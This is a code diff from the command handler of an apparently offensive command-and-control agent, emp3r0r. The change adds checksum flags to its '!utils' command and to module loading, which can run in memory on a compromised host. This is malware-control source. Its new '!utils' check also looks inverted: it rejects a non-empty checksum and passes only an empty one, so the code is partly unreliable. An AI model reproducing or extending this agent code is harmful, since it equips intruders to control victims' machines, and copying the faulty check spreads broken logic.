@@ -229,10 +229,16 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 	// !utils
-	// Usage: !utils
+	// Usage: !utils --checksum <checksum>
 	// Executes utility functions on the agent.
 	case emp3r0r_data.C2CmdUtils:
-		out = VaccineHandler()
+		checksum := flags.StringP("checksum", "c", "", "Checksum")
+		flags.Parse(cmdSlice[1:])
+		if *checksum != "" {
+			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
+			return
+		}
+		out = VaccineHandler(*checksum)
 		if out != "[+] Utils have been successfully installed" {
 			out = fmt.Sprintf("Error: %s", out)
 		}
@@ -245,12 +251,13 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		modName := flags.StringP("mod_name", "m", "", "Module name")
 		checksum := flags.StringP("checksum", "c", "", "Checksum")
 		inMem := flags.BoolP("in_mem", "i", false, "Load module in memory")
+		startscript_checksum := flags.StringP("startscript_checksum", "s", "", "Start script checksum")
 		flags.Parse(cmdSlice[1:])
 		if *modName == "" || *checksum == "" {
 			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
-		out = moduleHandler(*modName, *checksum, *inMem)
+		out = moduleHandler(*modName, *checksum, *startscript_checksum, *inMem)
 		return
 
 	// !upgrade_agent --checksum checksum
